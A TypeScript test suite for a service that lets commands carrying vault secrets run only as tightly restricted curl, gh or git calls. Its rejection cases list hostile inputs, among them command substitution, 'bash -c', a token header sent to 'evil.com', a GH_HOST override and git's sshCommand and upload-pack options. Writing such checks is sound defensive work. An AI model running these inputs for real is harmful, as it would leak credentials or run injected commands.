import { describe, expect, test } from "bun:test";
import { buildCommandSpec, parseSecretCommand, planSecretCommand, wordText } from "../services/secret-command.service";
import { VaultError } from "../services/vault.service";

const byEnv = new Map([
  ["SEGREDO_TOKEN", "token"],
  ["SEGREDO_OTHER", "other"],
]);
const values = new Map([
  ["token", 'tok"en\\1\t'],
  ["other", "other-value"],
]);

function plan(command: string) {
  return planSecretCommand(parseSecretCommand(command, byEnv));
}

function rejection(command: string) {
  try {
    plan(command);
  } catch (error) {
    if (error instanceof VaultError) return error.message;
    throw error;
  }
  return "accepted";
}

describe("parseSecretCommand", () => {
  test("splits words with quotes, escapes, variables and references", () => {
    const parsed = parseSecretCommand(
      `A=1 B=$SEGREDO_TOKEN curl  'single $X' "double \\$ \\" \\\\ \\n \${SEGREDO_OTHER}" esc\\ aped segredo:token-x '' x"$SEGREDO_TOKEN"y`,
      byEnv,
    );
    expect(parsed.assignments).toEqual([
      { name: "A", value: [{ text: "1" }] },
      { name: "B", value: [{ secret: "token" }] },
    ]);
    expect(parsed.words).toEqual([
      [{ text: "curl" }],
      [{ text: "single $X" }],
      [{ text: 'double $ " \\ \\n ' }, { secret: "other" }],
      [{ text: "esc aped" }],
      [{ secret: "token-x" }],
      [{ text: "" }],
      [{ text: "x" }, { secret: "token" }, { text: "y" }],
    ]);
    expect(wordText(parsed.words[2])).toBe('double $ " \\ \\n segredo:other');
    expect(parseSecretCommand("\tcurl\t", byEnv).words).toEqual([[{ text: "curl" }]]);
  });

  test("rejects shell features it cannot reproduce", () => {
    for (const command of [
      "curl a | gzip",
      "curl a; ls",
      "curl a && ls",
      "curl a > f",
      "curl a < f",
      "(curl a)",
      "curl `id`",
      "curl $(id)",
      'curl "$(id)"',
      'curl "`id`"',
      "curl a\nls",
      "# curl",
      "curl \\",
      "curl 'open",
      'curl "open',
      "curl $HOME",
      `curl "\${SEGREDO_TOKEN:0:4}"`,
      `curl \${SEGREDO_TOKEN#x}`,
      "curl $",
      "curl $SEGREDO_GHOST",
    ])
      expect(() => parseSecretCommand(command, byEnv)).toThrow(VaultError);
  });
});

describe("planSecretCommand", () => {
  test("accepts a single allowlisted program", () => {
    expect(rejection("")).toContain("Comando vazio");
    expect(rejection("A=$SEGREDO_TOKEN")).toContain("Comando vazio");
    expect(rejection("bash -c curl $SEGREDO_TOKEN")).toContain("só dá para rodar curl, gh ou git");
    expect(rejection("$SEGREDO_TOKEN https://a.com")).toContain("o nome do programa");
  });

  test("curl keeps only known options and needs https urls", () => {
    const ok = plan(
      `curl -sS -f --silent -HAccept:x -H "Authorization: Bearer $SEGREDO_TOKEN" --data-raw "k=$SEGREDO_OTHER" -o out --url https://api.a.com/u https://api.a.com/v`,
    );
    expect(ok.binary).toBe("curl");
    expect(ok.secrets).toEqual(["token", "other"]);
    expect(ok.urls.map((url) => url.href)).toEqual(["https://api.a.com/u", "https://api.a.com/v"]);
    for (const [command, message] of [
      ['A=1 curl -H "x: $SEGREDO_TOKEN" https://a.com', "não numa variável"],
      ['curl --proxy http://p -H "x: $SEGREDO_TOKEN" https://a.com', "--proxy"],
      ['curl -x http://p -H "x: $SEGREDO_TOKEN" https://a.com', "-x"],
      ['curl -sL -H "x: $SEGREDO_TOKEN" https://a.com', "-L"],
      ['curl -H "x: $SEGREDO_TOKEN" -o $SEGREDO_OTHER https://a.com', "--output"],
      ['curl -H "x: $SEGREDO_TOKEN" -d @- https://a.com', "@-"],
      ['curl -H "x: $SEGREDO_TOKEN"', "URL completa"],
      ['curl -H "x: $SEGREDO_TOKEN" -H', "precisa de um valor"],
      ["curl -s$SEGREDO_TOKEN https://a.com", "misturada"],
      ['curl -H "x: $SEGREDO_TOKEN" evil.com', "não é uma URL completa"],
      ['curl -H "x: $SEGREDO_TOKEN" http://a.com', "só vai por https"],
      ['curl -H "x: $SEGREDO_TOKEN" https://u:p@a.com', "usuário ou senha"],
      ['curl "--x$SEGREDO_TOKEN" https://a.com', "nome de uma opção"],
    ])
      expect([command, rejection(command)]).toEqual([command, expect.stringContaining(message)]);
  });

  test("gh needs a token variable and checks every host it can reach", () => {
    const ok = plan(
      "GH_TOKEN=$SEGREDO_TOKEN gh api --hostname=ghe.a.com --hostname x.a.com -R h.a.com/o/r --repo=o/r https://api.github.com/x",
    );
    expect(ok.implicitHosts).toEqual(["github.com", "ghe.a.com", "x.a.com", "h.a.com"]);
    expect(ok.urls.map((url) => url.host)).toEqual(["api.github.com"]);
    expect(plan("GITHUB_TOKEN=$SEGREDO_TOKEN gh pr list --hostname").implicitHosts).toEqual(["github.com", ""]);
    expect(rejection("GH_HOST=evil.com GH_TOKEN=$SEGREDO_TOKEN gh api user")).toContain("não GH_HOST");
    expect(rejection("GH_TOKEN=$SEGREDO_TOKEN gh auth token")).toContain("gh auth");
    expect(rejection("GH_TOKEN=$SEGREDO_TOKEN gh")).toContain("(vazio)");
    expect(rejection('gh api -H "x: $SEGREDO_TOKEN" user')).toContain("um argumento do gh");
  });

  test("git allows the token only in an http extra header and needs an https url", () => {
    const ok = plan(
      'git -c http.extraHeader="Authorization: Bearer $SEGREDO_TOKEN" push https://github.com/o/r.git main',
    );
    expect(ok.urls.map((url) => url.href)).toEqual(["https://github.com/o/r.git"]);
    for (const [command, message] of [
      ['A=1 git -c http.extraHeader="x: $SEGREDO_TOKEN" push https://github.com/o/r', "não vale variável"],
      [
        'git -c core.sshCommand=x -c http.extraHeader="x: $SEGREDO_TOKEN" push https://github.com/o/r',
        "core.sshcommand",
      ],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN" -c', "precisa de um valor"],
      ['git -C dir -c http.extraHeader="x: $SEGREDO_TOKEN" push https://github.com/o/r', "-C"],
      ['git commit -m "$SEGREDO_TOKEN"', "commit"],
      ["git $SEGREDO_TOKEN push https://github.com/o/r", "só pode ir em -c"],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN"', "(vazio)"],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN" push --upload-pack=x https://github.com/o/r', "--upload-pack"],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN" fetch -u x https://github.com/o/r', "-u"],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN" push git@github.com:o/r.git', "só fala https"],
      ['git -c http.extraHeader="x: $SEGREDO_TOKEN" push origin main', "URL https completa"],
      ['git -c http.extraHeader="x: y" push https://github.com/o/r "$SEGREDO_TOKEN"', "um argumento do git"],
    ])
      expect([command, rejection(command)]).toEqual([command, expect.stringContaining(message)]);
  });
});

describe("buildCommandSpec", () => {
  test("curl moves every secret argument to a config read from stdin", () => {
    const spec = buildCommandSpec(
      plan(
        `curl -s -H "Authorization: Bearer $SEGREDO_TOKEN" -o out --url https://api.a.com/u "https://api.a.com/v?k=$SEGREDO_OTHER"`,
      ),
      values,
    );
    expect(spec).toEqual({
      argv: ["curl", "--disable", "-s", "--output", "out", "--url", "https://api.a.com/u", "--config", "-"],
      env: {},
      stdin: 'header = "Authorization: Bearer tok\\"en\\\\1\\t"\nurl = "https://api.a.com/v?k=other-value"\n',
      tempHome: false,
    });
    expect(buildCommandSpec(plan("curl -s -H 'a: b' https://api.a.com/"), values).stdin).toBeNull();
    expect(() =>
      buildCommandSpec(plan('curl -H "x: $SEGREDO_TOKEN" https://a.com'), new Map([["token", "a\nb"]])),
    ).toThrow("quebra de linha");
  });

  test("gh gets the token in its env and a fresh config home", () => {
    expect(buildCommandSpec(plan("GH_TOKEN=$SEGREDO_OTHER gh api user"), values)).toEqual({
      argv: ["gh", "api", "user"],
      env: { GH_TOKEN: "other-value", GH_PROMPT_DISABLED: "1", GH_NO_UPDATE_NOTIFIER: "1", GH_SPINNER_DISABLED: "1" },
      stdin: null,
      tempHome: true,
    });
  });

  test("git gets the header scoped to the url and hardened config through the env", () => {
    const spec = buildCommandSpec(
      plan('git -c http.extraHeader="Authorization: Bearer $SEGREDO_OTHER" push https://github.com/o/r.git main'),
      values,
    );
    expect(spec.argv).toEqual(["git", "push", "https://github.com/o/r.git", "main"]);
    expect(spec.argv.join(" ")).not.toContain("other-value");
    const count = Number(spec.env.GIT_CONFIG_COUNT);
    const config = Object.fromEntries(
      Array.from({ length: count }, (_, index) => [
        spec.env[`GIT_CONFIG_KEY_${index}`],
        spec.env[`GIT_CONFIG_VALUE_${index}`],
      ]),
    );
    expect(config).toMatchObject({
      "http.https://github.com/.extraHeader": "Authorization: Bearer other-value",
      "http.proxy": "",
      "core.hooksPath": "/dev/null",
      "credential.helper": "",
      "protocol.allow": "never",
    });
    expect(spec.env).toMatchObject({ GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0" });
  });
});
